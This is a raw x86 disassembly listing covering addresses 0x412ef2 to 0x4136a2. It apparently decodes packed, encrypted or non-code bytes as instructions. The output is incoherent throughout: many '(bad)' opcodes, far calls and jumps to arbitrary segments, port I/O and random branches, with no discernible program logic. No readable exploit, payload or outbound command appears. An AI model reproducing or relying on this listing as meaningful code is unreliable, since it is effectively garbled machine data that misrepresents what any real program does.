  412ef2:	sti    
  412ef3:	call   0x9a33:0x73090946
  412efa:	inc    esi
  412efb:	mov    DWORD PTR [esi-0x6d],ebp
  412efe:	out    dx,eax
  412eff:	std    
  412f00:	sub    BYTE PTR [ebx+0x1ae1bf9e],dh
  412f06:	sbb    eax,0xe576d519
  412f0b:	les    ebp,FWORD PTR [esi-0x3d]
  412f0e:	add    esi,ecx
  412f10:	jl     0x412ef3
  412f12:	push   cs
  412f13:	push   esi
  412f14:	mov    eax,ds:0x7a7b44e6
  412f19:	inc    edx
  412f1a:	add    al,0xff
  412f1c:	mov    esp,0x1707c837
  412f21:	add    DWORD PTR [eax+0x3f],esi
  412f24:	inc    DWORD PTR [edi+0xf245c70]
  412f2a:	xlat   BYTE PTR ds:[ebx]
  412f2b:	out    dx,eax
  412f2c:	pop    esi
  412f2d:	cmp    eax,0x77bd66ce
  412f32:	push   ss
  412f33:	adc    esp,esp
  412f35:	mov    cl,0xad
  412f37:	pop    edi
  412f38:	sti    
  412f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f3a:	jg     0x412f5d
  412f3c:	jmp    0xe30dcb63
  412f41:	cmc    
  412f42:	or     BYTE PTR ss:[ecx+eiz*2],cl
  412f46:	push   eax
  412f47:	xor    ch,BYTE PTR [eax+0x27aacfc]
  412f4d:	or     edx,DWORD PTR [ecx-0x3f]
  412f50:	jb     0x412f96
  412f52:	retf   0x5a38
  412f55:	or     eax,0x1e15d86e
  412f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f5b:	sub    edi,0xe2fe875d
  412f61:	in     al,dx
  412f62:	imul   eax,esp,0x3a
  412f65:	outs   dx,BYTE PTR ds:[esi]
  412f66:	dec    ebp
  412f67:	sub    BYTE PTR [ebx+0x37],bh
  412f6a:	jge    0x412fce
  412f6c:	stos   BYTE PTR es:[edi],al
  412f6d:	pop    ebx
  412f6e:	sbb    eax,0xed2c3a7d
  412f73:	add    eax,0x32f68442
  412f78:	push   ss
  412f79:	repz push esp
  412f7b:	jecxz  0x412f24
  412f7d:	es jo  0x412f8c
  412f80:	aad    0x3c
  412f82:	stos   BYTE PTR es:[edi],al
  412f83:	and    eax,0x63af8a18
  412f88:	pop    eax
  412f89:	das    
  412f8a:	fidivr DWORD PTR [ebx-0x56]
  412f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f8e:	rcr    BYTE PTR [ebx+0x7e],0x5a
  412f92:	adc    bh,BYTE PTR [edx]
  412f94:	fcom   QWORD PTR [eax+edx*8+0x5577acbe]
  412f9b:	push   edi
  412f9c:	rol    DWORD PTR [ebx],cl
  412f9e:	and    bh,BYTE PTR [esi+0x4d]
  412fa1:	or     edi,DWORD PTR [ecx]
  412fa3:	push   es
  412fa4:	pop    esp
  412fa5:	std    
  412fa6:	sub    eax,0xadec707b
  412fab:	icebp  
  412fac:	ror    BYTE PTR ss:[edx+0x31bac666],1
  412fb3:	aad    0x6c
  412fb5:	fwait
  412fb6:	nop
  412fb7:	stos   BYTE PTR es:[edi],al
  412fb8:	call   0xde96:0xe2554a05
  412fbf:	mov    ds:0x88a736dc,al
  412fc4:	add    BYTE PTR [ebx],ch
  412fc6:	cmp    al,0x17
  412fc8:	xchg   ebp,eax
  412fc9:	fistp  QWORD PTR [esi+0x59]
  412fcc:	js     0x412fe6
  412fce:	idiv   BYTE PTR [ecx+0x1bb1bdd0]
  412fd4:	xchg   ebx,eax
  412fd5:	aas    
  412fd6:	enter  0x75a8,0xc0
  412fda:	sbb    eax,0x6a40a79
  412fdf:	retf   
  412fe0:	cmp    al,0x5b
  412fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe3:	mov    eax,ebp
  412fe5:	add    al,0xf
  412fe7:	mov    cl,0x8a
  412fe9:	jp     0x413041
  412feb:	sbb    BYTE PTR [edx-0x48],dh
  412fee:	pop    ebx
  412fef:	iret   
  412ff0:	push   ds
  412ff1:	add    BYTE PTR [ebx+0xb],dl
  412ff4:	pop    ebp
  412ff5:	jl     0x413023
  412ff7:	fisubr WORD PTR [esi]
  412ff9:	lods   eax,DWORD PTR ds:[esi]
  412ffa:	mov    bh,dl
  412ffc:	push   edi
  412ffd:	push   esp
  412ffe:	(bad)  
  412fff:	xchg   ebp,eax
  413000:	sbb    bl,BYTE PTR [edx]
  413002:	clc    
  413003:	inc    ecx
  413004:	or     eax,0x934a16dc
  413009:	icebp  
  41300a:	retf   0x6f91
  41300d:	add    DWORD PTR [ebx],ecx
  41300f:	(bad)
  413014:	or     ebp,ebp
  413016:	sub    DWORD PTR [ecx-0x7e],ebp
  413019:	mov    ecx,0x6723af66
  41301e:	dec    ebp
  41301f:	or     eax,0x373065b1
  413024:	cwde   
  413025:	shr    edx,cl
  413027:	int3   
  413028:	test   al,0x5f
  41302a:	imul   esi,ebp,0x4773585c
  413030:	mov    ch,BYTE PTR [edx]
  413032:	jecxz  0x41304e
  413034:	repnz out dx,eax
  413036:	fwait
  413037:	rcl    DWORD PTR [ebx-0x62],1
  41303a:	mov    ah,0x20
  41303c:	fist   WORD PTR [edx+0x73c7ce37]
  413042:	lods   al,BYTE PTR ds:[esi]
  413043:	jecxz  0x413062
  413045:	mov    al,0x9a
  413047:	stos   BYTE PTR es:[edi],al
  413048:	scas   eax,DWORD PTR es:[edi]
  413049:	imul   esp,DWORD PTR [esi+0x61f438b6],0xffffff9e
  413050:	xchg   esi,eax
  413051:	and    edx,DWORD PTR [edi+0x6c]
  413054:	test   BYTE PTR [eax],0xbe
  413057:	sahf   
  413058:	xchg   edx,eax
  413059:	pop    ss
  41305a:	adc    BYTE PTR [ecx],cl
  41305c:	call   FWORD PTR [ecx]
  41305e:	pop    ebp
  41305f:	inc    ecx
  413060:	push   edi
  413061:	shl    DWORD PTR [edi],0xcc
  413064:	sbb    bh,0x38
  413067:	jg     0x41309c
  413069:	setnp  dh
  41306c:	in     eax,dx
  41306d:	pop    esi
  41306e:	inc    edi
  41306f:	jle    0x41303f
  413071:	fistp  WORD PTR [eax+0x22cfa32]
  413077:	add    al,0x3
  413079:	cmp    edi,DWORD PTR [edi-0x44ed6ece]
  41307f:	cmp    dh,bh
  413081:	push   esi
  413082:	add    esp,DWORD PTR [esi+0x74]
  413085:	mov    ds:0x63563b81,eax
  41308a:	(bad)  
  41308b:	push   esi
  41308c:	ins    BYTE PTR es:[edi],dx
  41308d:	jae    0x413010
  41308f:	test   eax,0xf0a548ad
  413094:	mov    BYTE PTR [ecx+0xc4b9cd8],ah
  41309a:	jp     0x4130d5
  41309c:	retf   0x4b24
  41309f:	mov    ah,0xd7
  4130a1:	cmp    eax,0x55f89499
  4130a6:	xchg   DWORD PTR [eax],ebx
  4130a8:	push   ds
  4130a9:	popa   
  4130aa:	addr16 add esi,esi
  4130ad:	leave  
  4130ae:	adc    dl,bl
  4130b0:	and    esp,0x17
  4130b3:	adc    al,0xd5
  4130b5:	or     eax,0x62ea8285
  4130ba:	mov    ebp,eax
  4130bc:	mov    bh,0x64
  4130be:	jo     0x4130a8
  4130c0:	pop    edx
  4130c1:	rcl    DWORD PTR [ecx],1
  4130c3:	in     eax,0xa7
  4130c5:	cld    
  4130c6:	cmp    al,0xd0
  4130c8:	sti    
  4130c9:	sbb    ebp,DWORD PTR [edx-0x6d]
  4130cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cd:	xor    ebp,DWORD PTR [ebx-0x65]
  4130d0:	ins    BYTE PTR es:[edi],dx
  4130d1:	fisubr WORD PTR [ebp-0x7]
  4130d4:	call   FWORD PTR [eax]
  4130d6:	lahf   
  4130d7:	aaa    
  4130d8:	lods   al,BYTE PTR ds:[esi]
  4130d9:	int3   
  4130da:	repnz int3 
  4130dc:	in     al,0x9b
  4130de:	push   ecx
  4130df:	jge    0x4130f8
  4130e1:	ss pop ebx
  4130e3:	sub    dh,BYTE PTR [edi]
  4130e5:	mov    edx,0xb59e1583
  4130ea:	xor    DWORD PTR [eax-0x34e5ce15],esi
  4130f0:	adc    al,0x23
  4130f2:	scas   eax,DWORD PTR es:[edi]
  4130f3:	dec    ebp
  4130f4:	inc    ebp
  4130f5:	mov    al,ds:0xcb948f6
  4130fa:	inc    esp
  4130fb:	push   ss
  4130fc:	(bad)  
  4130fd:	ds mov dl,0xf5
  413100:	test   BYTE PTR [eax],bl
  413102:	jne    0x41313b
  413104:	aad    0xa0
  413106:	lods   al,BYTE PTR ds:[esi]
  413107:	push   esi
  413108:	jnp    0x413189
  41310a:	retf   0x534b
  41310d:	jmp    0x413137
  41310f:	push   es
  413110:	push   ss
  413111:	sub    eax,DWORD PTR [eax+0x7569c752]
  413117:	imul   esp,edi,0xb3cc1b85
  41311d:	dec    edi
  41311e:	test   al,0xc
  413120:	xlat   BYTE PTR ds:[ebx]
  413121:	(bad)  
  413122:	popf   
  413123:	ja     0x4130fa
  413125:	cmc    
  413126:	and    ch,ah
  413128:	(bad)  
  413129:	shl    BYTE PTR [edx],0x5e
  41312c:	fmul   DWORD PTR [ecx-0x11]
  41312f:	repnz cdq 
  413131:	fs jnp 0x413157
  413134:	lods   al,BYTE PTR ds:[esi]
  413135:	addr16 mov ds:0x9cf2,al
  413139:	dec    esi
  41313a:	xor    BYTE PTR [esi+0x5b],dh
  41313d:	or     eax,0xe37e02f9
  413142:	and    BYTE PTR [edx],cl
  413144:	ja     0x4131a4
  413146:	mov    bl,0xbf
  413148:	dec    eax
  413149:	mov    ebp,0x238f85cd
  41314e:	aaa    
  41314f:	mov    eax,ds:0x45741dad
  413154:	adc    BYTE PTR [edx],cl
  413156:	fidiv  DWORD PTR [edx+0x61cf7dea]
  41315c:	jbe    0x41314a
  41315e:	add    BYTE PTR [edi+0x56],dl
  413161:	pushf  
  413162:	inc    esi
  413163:	lea    esp,[ebx-0x4]
  413166:	out    dx,eax
  413167:	repnz cmp ebp,ebx
  41316a:	loope  0x41315e
  41316c:	jb     0xd5404971
  413172:	jbe    0x41313e
  413174:	out    dx,eax
  413175:	stos   DWORD PTR es:[edi],eax
  413176:	inc    edx
  413177:	sub    ah,BYTE PTR [edx]
  413179:	adc    al,0x3b
  41317b:	lea    ecx,[eax]
  41317d:	xchg   ebx,eax
  41317e:	test   eax,0x7bda3914
  413183:	ds or  al,0xa9
  413186:	ins    BYTE PTR es:[edi],dx
  413187:	xchg   ebp,eax
  413188:	sub    eax,0xcc0fb597
  41318d:	pop    es
  41318e:	push   0xffffff9d
  413190:	ds popf 
  413192:	and    esp,DWORD PTR [edx]
  413194:	int    0x4e
  413196:	ja     0x4131f0
  413198:	pop    es
  413199:	mov    ecx,DWORD PTR [ecx]
  41319b:	mov    al,0x83
  41319d:	sahf   
  41319e:	dec    edi
  41319f:	icebp  
  4131a0:	ret    
  4131a1:	lods   al,BYTE PTR ds:[esi]
  4131a2:	or     al,BYTE PTR [ecx-0x79]
  4131a5:	movd   mm5,DWORD PTR [edx-0x66007b46]
  4131ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ad:	xor    eax,0x7e8da022
  4131b2:	pop    ebp
  4131b3:	push   esi
  4131b4:	push   esp
  4131b5:	inc    ecx
  4131b6:	or     DWORD PTR [ebx],ecx
  4131b8:	nop
  4131b9:	inc    esi
  4131ba:	xor    BYTE PTR [esi+0x33],ah
  4131bd:	or     eax,0x55c88156
  4131c2:	nop
  4131c3:	shr    BYTE PTR [ecx-0x68],cl
  4131c6:	lock lods eax,DWORD PTR ds:[esi]
  4131c8:	in     eax,dx
  4131c9:	push   es
  4131ca:	cdq    
  4131cb:	push   ds
  4131cc:	iret   
  4131cd:	or     DWORD PTR [ebp-0x6c795d79],esi
  4131d3:	adc    eax,0x39e7ddb6
  4131d8:	push   ds
  4131d9:	test   eax,0x328ecd07
  4131de:	rol    DWORD PTR [ebp+0x18],0x41
  4131e2:	ficomp WORD PTR [eax]
  4131e4:	push   esp
  4131e5:	fdiv   st(2),st
  4131e7:	out    0xe8,al
  4131e9:	clc    
  4131ea:	loope  0x41321e
  4131ec:	mov    eax,0x56e5fe22
  4131f1:	inc    ebp
  4131f2:	test   DWORD PTR [esp+ebp*1+0x7b],eax
  4131f6:	xor    BYTE PTR [edi],ah
  4131f8:	in     al,0xa2
  4131fa:	mov    ecx,0xa034024a
  4131ff:	es or  dl,al
  413202:	mov    edi,0x8a3345b5
  413207:	call   0x709f:0xb4c33ec0
  41320e:	js     0x413266
  413210:	pop    ds
  413211:	mov    al,cs:0x65569fb1
  413217:	int3   
  413218:	(bad)  
  413219:	sbb    BYTE PTR [edi+0x90d4a41],dl
  41321f:	or     al,0xb6
  413221:	pop    eax
  413222:	cmp    dh,al
  413224:	rcr    DWORD PTR [edx+0x71],cl
  413227:	pop    ebp
  413228:	xchg   ebp,eax
  413229:	push   ds
  41322a:	dec    esp
  41322b:	ret    0x3f60
  41322e:	sbb    al,0x3c
  413230:	fisttp WORD PTR [eax+0x23d2aee4]
  413236:	dec    ebx
  413237:	(bad)  
  413238:	push   esi
  413239:	xor    eax,eax
  41323b:	sbb    ah,ch
  41323d:	rcl    DWORD PTR [edx+edx*1-0x4aa96288],1
  413244:	push   ebx
  413245:	cld    
  413246:	add    BYTE PTR [ebx+0x63395556],al
  41324c:	ds xor al,0xf8
  41324f:	xor    DWORD PTR [edi-0x2ee3217d],ebp
  413255:	and    ch,bh
  413257:	push   edi
  413258:	xor    eax,0x24c77b2c
  41325d:	xor    ecx,DWORD PTR [ecx]
  41325f:	dec    eax
  413260:	mov    ds:0x6d00a2c,al
  413265:	ret    
  413266:	call   0x5931304b
  41326b:	popa   
  41326c:	imul   esp,DWORD PTR [edi+0x2c],0x2f
  413270:	sbb    BYTE PTR [eax-0x562850ac],bl
  413276:	xor    al,0xfb
  413278:	push   0xffffff9f
  41327a:	xchg   ebx,eax
  41327b:	scas   al,BYTE PTR es:[edi]
  41327c:	(bad)  
  41327e:	daa    
  41327f:	rcr    BYTE PTR [ecx-0x28d23d61],cl
  413285:	in     al,0x9b
  413287:	loop   0x4132d0
  413289:	sbb    eax,edi
  41328b:	mov    ecx,0xd5b7a41a
  413290:	mov    ch,0x4f
  413292:	out    0xeb,al
  413294:	mov    edi,0x9bd96d0b
  413299:	gs push 0x7daccce1
  41329f:	call   0x169a1680
  4132a4:	vpmulhuw ymm4,ymm1,YMMWORD PTR [ebp+0x3781084d]
  4132ac:	hlt    
  4132ad:	fst    st(6)
  4132af:	add    DWORD PTR [edx+0x432f6917],ebx
  4132b5:	jmp    0x5665:0xa85ebf1e
  4132bc:	cmc    
  4132bd:	in     al,dx
  4132be:	sub    DWORD PTR [eax+0x16],ebx
  4132c1:	into   
  4132c2:	stos   BYTE PTR es:[edi],al
  4132c3:	icebp  
  4132c4:	xor    ecx,DWORD PTR [ecx+0xe]
  4132c7:	(bad)  
  4132c8:	adc    BYTE PTR [eax],dh
  4132ca:	mov    al,0xb5
  4132cc:	pop    esi
  4132cd:	pop    eax
  4132ce:	push   ebp
  4132cf:	ds jbe 0x41327d
  4132d2:	or     BYTE PTR ss:[ebp+0x51],bh
  4132d6:	pop    esi
  4132d7:	jne    0x413319
  4132d9:	fist   WORD PTR [esi]
  4132db:	cmp    dh,BYTE PTR [ebx-0x4aaf2717]
  4132e1:	sbb    BYTE PTR [edx-0x49],0x77
  4132e5:	push   cs
  4132e6:	inc    ecx
  4132e7:	jns    0x4132e5
  4132e9:	hlt    
  4132ea:	das    
  4132eb:	adc    BYTE PTR [ebx],bh
  4132ed:	lahf   
  4132ee:	mov    ds:0xa6de7e43,eax
  4132f3:	or     edi,edi
  4132f5:	data16 jmp 0x4132c3
  4132f8:	outs   dx,DWORD PTR ds:[esi]
  4132f9:	add    dh,BYTE PTR [ebx+0x707ce07a]
  4132ff:	mov    dh,0x63
  413301:	icebp  
  413302:	mov    edx,0xdad38d5a
  413307:	cli    
  413308:	adc    al,0xea
  41330a:	fcmovne st,st(7)
  41330c:	js     0x4132e6
  41330e:	cwde   
  41330f:	test   BYTE PTR [ecx+eax*2+0x4bd9c221],dl
  413316:	pop    edi
  413317:	mov    bl,0x3
  413319:	pop    ebp
  41331a:	push   0x8867a99e
  41331f:	add    al,0x32
  413321:	sar    ebp,cl
  413323:	jmp    0x413330
  413325:	xor    eax,0xf0fb2548
  41332a:	leave  
  41332b:	push   cs
  41332c:	push   ss
  41332d:	in     eax,dx
  41332e:	cli    
  41332f:	aaa    
  413330:	lock lock xchg esp,eax
  413333:	loop   0x41331d
  413335:	es pop edi
  413337:	adc    ah,0xc
  41333a:	cmp    DWORD PTR [esi-0x9],ebp
  41333d:	stos   DWORD PTR es:[edi],eax
  41333e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41333f:	jae    0x413381
  413341:	stos   BYTE PTR es:[edi],al
  413342:	(bad)  
  413344:	rcl    DWORD PTR [esi+0x6cb388b9],cl
  41334a:	stos   DWORD PTR es:[edi],eax
  41334b:	(bad)  
  41334c:	mov    edx,0xc6ea6eeb
  413351:	mov    ecx,0x26e3ce30
  413356:	repz int3 
  413358:	pop    ds
  413359:	sti    
  41335a:	frstor [edx-0x61807816]
  413360:	mov    al,0x24
  413362:	mov    ebp,0x27e99583
  413367:	cmovae ebx,DWORD PTR [edx-0xc49ec5e]
  41336e:	stos   DWORD PTR es:[edi],eax
  41336f:	stc    
  413370:	add    eax,0xf04dba11
  413375:	fwait
  413376:	or     DWORD PTR [ebx-0x5],esi
  413379:	(bad)  
  41337a:	fisubr WORD PTR ds:0x1550eb
  413380:	ret    
  413381:	retf   
  413382:	xchg   DWORD PTR [eax+0x7d],edx
  413385:	scas   eax,DWORD PTR es:[edi]
  413386:	cmp    DWORD PTR [edx],0x71
  413389:	jns    0x4133c4
  41338b:	in     eax,dx
  41338c:	test   BYTE PTR [esi-0x7f],dh
  41338f:	fsubr  DWORD PTR [esi-0xf839fe1]
  413395:	xchg   esi,eax
  413396:	imul   BYTE PTR [esi-0x2e]
  413399:	mov    ah,0xe0
  41339b:	js     0x413402
  41339d:	dec    edi
  41339e:	jle    0x4133d3
  4133a0:	jnp    0x4133b6
  4133a2:	aad    0x66
  4133a4:	lds    edi,FWORD PTR [esi]
  4133a6:	sbb    al,0x66
  4133a8:	das    
  4133a9:	xchg   esi,eax
  4133aa:	push   ebp
  4133ab:	mov    ebx,0x3d79a7c2
  4133b0:	imul   ebx,DWORD PTR [esi+ebx*1],0xef3a4ae9
  4133b7:	gs adc eax,0x2ca01dca
  4133bd:	cli    
  4133be:	(bad)  
  4133bf:	lea    ebx,[eax-0x3ff6e105]
  4133c5:	xchg   DWORD PTR [ebx],esp
  4133c7:	rcl    DWORD PTR [eax+0x74],cl
  4133ca:	cmc    
  4133cb:	xchg   ebx,eax
  4133cc:	mov    esi,DWORD PTR [esi+0x5736c4e5]
  4133d2:	cmc    
  4133d3:	imul   ecx,DWORD PTR [ebp-0x63],0x2b5ff869
  4133da:	inc    esi
  4133db:	push   ecx
  4133dc:	cmc    
  4133dd:	ret    0x4dc7
  4133e0:	xchg   ebp,eax
  4133e1:	vsubps xmm1,xmm1,XMMWORD PTR [ebp+0x79]
  4133e6:	cmp    DWORD PTR [eax-0x67],0xfffffff1
  4133ea:	lahf   
  4133eb:	jne    0x41337f
  4133ed:	sub    DWORD PTR ds:0xecb6ff49,ebx
  4133f3:	stc    
  4133f4:	gs dec ebx
  4133f6:	stos   BYTE PTR es:[edi],al
  4133f7:	nop
  4133f8:	call   0x889ffbf4
  4133fd:	add    dh,BYTE PTR [edi]
  4133ff:	jne    0x41343f
  413401:	(bad)  
  413402:	pop    esp
  413403:	lds    edi,FWORD PTR [ebp-0x4e]
  413406:	mov    ebx,0x3d75919b
  41340b:	popf   
  41340c:	lods   al,BYTE PTR ds:[esi]
  41340d:	or     BYTE PTR [edx-0x4],ch
  413410:	mov    eax,ds:0x604395c7
  413415:	add    DWORD PTR [edx],0xffffffdb
  413418:	dec    ecx
  413419:	add    DWORD PTR [eax-0x1754518c],esi
  41341f:	push   0xffffffd4
  413421:	lock imul esp,DWORD PTR [ecx-0x20d19fb2],0xffffffe0
  413429:	inc    edx
  41342a:	xor    DWORD PTR [ebx+0x6],ebp
  41342d:	in     al,dx
  41342e:	cmp    eax,0x311d4ac0
  413433:	nop
  413434:	sub    ebp,DWORD PTR [esi+0x77]
  413437:	div    DWORD PTR [edi]
  413439:	int    0x7f
  41343b:	inc    ebp
  41343c:	stos   BYTE PTR es:[edi],al
  41343d:	sahf   
  41343e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41343f:	lock or al,0x9f
  413442:	jbe    0x413454
  413444:	fld    TBYTE PTR [esi]
  413446:	ja     0x41344d
  413448:	cmp    edi,eax
  41344a:	ins    DWORD PTR es:[edi],dx
  41344b:	adc    ecx,0x6
  41344e:	dec    ebx
  41344f:	push   ds
  413450:	xor    BYTE PTR [ebx],al
  413452:	jb     0x4134a8
  413454:	(bad)  
  413455:	dec    edi
  413456:	jg     0x413489
  413458:	cli    
  413459:	pop    ss
  41345a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41345b:	mov    esi,0x5ecaf57c
  413460:	inc    ebp
  413461:	xor    BYTE PTR [edx+0x79],bh
  413464:	add    eax,0xe35e25f
  413469:	cmp    DWORD PTR [edi+0x2c0088bc],0x9d52e2cd
  413473:	and    al,0x37
  413475:	repz addr16 aam 0x7f
  413479:	je     0x41349a
  41347b:	leave  
  41347c:	sahf   
  41347d:	mov    dh,0xb7
  41347f:	scas   al,BYTE PTR es:[edi]
  413480:	sub    al,0x21
  413482:	add    ecx,edi
  413484:	das    
  413485:	fstp   TBYTE PTR [ecx]
  413487:	and    al,0x8f
  413489:	cli    
  41348a:	push   ebx
  41348b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41348c:	enter  0xc630,0x1e
  413490:	sub    esp,DWORD PTR [ebp+0x12]
  413493:	adc    ebx,edi
  413495:	ins    BYTE PTR es:[edi],dx
  413496:	out    dx,al
  413497:	mov    al,ds:0x2349c64f
  41349c:	(bad)  
  41349d:	sbb    eax,0x8f3b3914
  4134a2:	sub    dh,BYTE PTR [edx]
  4134a4:	xchg   ecx,eax
  4134a5:	(bad)  
  4134a6:	ss sub al,0xc3
  4134a9:	and    eax,0xaf6847b6
  4134ae:	in     eax,dx
  4134af:	jecxz  0x413480
  4134b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134b2:	mov    dh,0xee
  4134b4:	rcl    BYTE PTR [eax+ebp*2-0x572cde1a],0x20
  4134bc:	mov    edx,0x41d952c3
  4134c1:	icebp  
  4134c2:	xchg   BYTE PTR [edi-0x5ac5ff49],bh
  4134c8:	fsub   QWORD PTR [eax-0x45]
  4134cb:	pop    ds
  4134cc:	or     edi,esp
  4134ce:	xchg   DWORD PTR [edx+0x5dc4e172],edx
  4134d4:	dec    esi
  4134d5:	and    ebx,DWORD PTR [ebx]
  4134d7:	and    dl,BYTE PTR [eax+eax*1]
  4134da:	stos   DWORD PTR es:[edi],eax
  4134db:	xchg   edx,eax
  4134dc:	cmp    BYTE PTR [ecx-0x10],0xe2
  4134e0:	mov    ds:0x4d73f9c1,al
  4134e5:	sahf   
  4134e6:	mov    bh,0x44
  4134e8:	ss xchg edi,eax
  4134ea:	add    al,0xd
  4134ec:	out    dx,eax
  4134ed:	test   al,0x79
  4134f0:	jae    0x413569
  4134f2:	mov    dl,0xc7
  4134f4:	and    BYTE PTR [esi-0x54],bl
  4134f7:	cmp    al,0x3f
  4134f9:	iret   
  4134fa:	pop    eax
  4134fb:	push   esp
  4134fc:	neg    DWORD PTR [eax+0x2d95597f]
  413502:	inc    ecx
  413503:	cmp    edx,DWORD PTR [ecx-0x53b17504]
  413509:	push   ecx
  41350a:	add    edi,DWORD PTR [edi]
  41350c:	mov    dh,0x35
  41350e:	psrlw  mm2,mm0
  413511:	adc    DWORD PTR [ebx],ebx
  413513:	ja     0x4134c6
  413515:	scas   al,BYTE PTR es:[edi]
  413516:	imul   edi,DWORD PTR [ecx],0xfa6fd049
  41351c:	mov    ds:0xe7310a5d,eax
  413521:	ret    
  413522:	mov    ebx,0x1af505b7
  413527:	jnp    0x4134b5
  413529:	jb     0x413565
  41352b:	lods   al,BYTE PTR ds:[esi]
  41352c:	mov    cl,0x14
  41352e:	idiv   edi
  413530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413531:	sbb    cl,al
  413533:	add    DWORD PTR [esi],ebp
  413535:	popa   
  413536:	out    0xa5,al
  413538:	pop    eax
  413539:	icebp  
  41353a:	pop    ss
  41353b:	pop    ds
  41353c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41353d:	aam    0xfb
  41353f:	loop   0x413548
  413541:	pop    ebx
  413542:	mov    ecx,0x9db8e4c5
  413547:	jle    0x4134c9
  413549:	test   dl,ah
  41354b:	aam    0xef
  41354d:	sbb    edi,DWORD PTR [esi-0x2f]
  413550:	loopne 0x4135a1
  413552:	fucomip st,st(5)
  413554:	jmp    0xcc68:0xd671c5a0
  41355b:	pop    ss
  41355c:	es or  al,0xf1
  41355f:	dec    ecx
  413560:	jecxz  0x41357e
  413562:	jge    0x413562
  413564:	ss dec eax
  413566:	mov    BYTE PTR [ebp+0x51],dl
  413569:	(bad)  
  41356a:	lds    esi,FWORD PTR [edi]
  41356c:	(bad)  
  41356d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41356e:	sbb    eax,0xd3c0b1f9
  413573:	cmp    eax,0x4770db88
  413578:	cmp    eax,0x8e496d3
  41357d:	pushf  
  41357e:	adc    ah,al
  413580:	sub    eax,0xf5bffdea
  413585:	pop    ebp
  413586:	sub    al,0x43
  413588:	mov    edi,0x9b4f22f7
  41358d:	dec    esp
  41358e:	jbe    0x41355a
  413590:	mov    ch,0x9e
  413592:	fs or  ebx,edx
  413595:	rcr    BYTE PTR [eax+ebx*4-0x67d25461],0x9a
  41359d:	fdiv   QWORD PTR [edi+0x7c]
  4135a0:	or     eax,0x942e155
  4135a5:	leave  
  4135a6:	je     0x4135a2
  4135a8:	inc    ebx
  4135a9:	cmc    
  4135aa:	cwde   
  4135ab:	fsub   QWORD PTR [ecx]
  4135ad:	mov    ebp,0x9af8051d
  4135b2:	mov    fs,WORD PTR [edx-0x338e8d6]
  4135b8:	jl     0x4135e2
  4135ba:	adc    dh,BYTE PTR [eax+esi*2-0x53]
  4135be:	sub    al,0x74
  4135c0:	sub    al,BYTE PTR [ebp+0x13451cfe]
  4135c6:	mov    ebx,0xea6f5062
  4135cb:	int    0x29
  4135cd:	enter  0x27e0,0x25
  4135d1:	inc    ebx
  4135d2:	pop    ds
  4135d3:	mov    bl,0x5a
  4135d5:	enter  0x4727,0xe3
  4135d9:	jg     0x413587
  4135db:	add    eax,0xdf770dac
  4135e0:	ds jb  0x413595
  4135e3:	xor    DWORD PTR [ecx-0x5c],esp
  4135e6:	mov    dl,0x2
  4135e8:	sti    
  4135e9:	push   ss
  4135ea:	add    al,0x1a
  4135ec:	mov    bl,al
  4135ee:	std    
  4135ef:	cmp    ah,BYTE PTR [ebx]
  4135f1:	xlat   BYTE PTR ds:[ebx]
  4135f2:	js     0x4135c7
  4135f4:	xor    DWORD PTR [ecx],0x1d
  4135f7:	sbb    al,0x5c
  4135f9:	rcl    DWORD PTR [edx],cl
  4135fb:	sti    
  4135fc:	adc    al,0x12
  4135fe:	lea    ebx,[eax]
  413600:	or     dl,BYTE PTR [edi]
  413602:	imul   ebp,esi,0x521cef6e
  413608:	pop    es
  413609:	mov    bl,0x6b
  41360b:	xchg   edx,eax
  41360c:	ret    0xf9de
  41360f:	or     ebp,DWORD PTR [edi+0x332c2896]
  413615:	mov    ds:0x5307c18e,eax
  41361a:	fs xchg esp,eax
  41361c:	sbb    bh,BYTE PTR [edi+0xa]
  41361f:	lahf   
  413620:	sub    BYTE PTR [edx+0x3a],ah
  413623:	out    0xbb,eax
  413625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413626:	imul   ebp,DWORD PTR [edi],0x4c954b7e
  41362c:	in     eax,0x2d
  41362e:	cdq    
  41362f:	out    0x32,al
  413631:	mov    ch,0xde
  413633:	stc    
  413634:	jnp    0x41361a
  413636:	pop    esi
  413637:	into   
  413638:	popa   
  413639:	or     ch,al
  41363b:	scas   eax,DWORD PTR es:[edi]
  41363c:	rcl    BYTE PTR [ebp-0x5cdea0ac],cl
  413642:	fild   WORD PTR [edi+0x7dbc3fa1]
  413648:	stc    
  413649:	and    bl,al
  41364b:	push   ebp
  41364c:	xlat   BYTE PTR ds:[ebx]
  41364d:	or     al,BYTE PTR [edx+0x2a]
  413650:	jg     0x4135e0
  413652:	mov    WORD PTR [edx-0x71cceb7],ds
  413658:	dec    edi
  413659:	inc    ecx
  41365a:	fwait
  41365b:	mov    ebp,0xcc000d6f
  413660:	mov    eax,0x4306c6a4
  413665:	pop    es
  413666:	mov    edi,0x3354307e
  41366b:	push   esp
  41366c:	sub    BYTE PTR [edx+0x10c426aa],cl
  413672:	jmp    DWORD PTR [ecx+ecx*1]
  413675:	mov    edi,0x8ca4c038
  41367a:	and    al,0x10
  41367c:	jns    0x4136b2
  41367e:	repz add al,0x1
  413681:	dec    ecx
  413682:	shl    DWORD PTR [ecx+0x32],1
  413685:	and    bl,BYTE PTR [ebx+0x203ddba9]
  41368b:	frstor [edi-0x7c9c1406]
  413691:	mov    esi,0x3f1fb023
  413696:	pop    ds
  413697:	sub    BYTE PTR [ecx],bh
  413699:	sbb    BYTE PTR [edi-0x1a],al
  41369c:	sbb    al,0xb4
  41369e:	push   edx
  41369f:	sub    eax,esp
  4136a1:	pop    ds
  4136a2:	call   0xbdd2:0xe83b2d1e
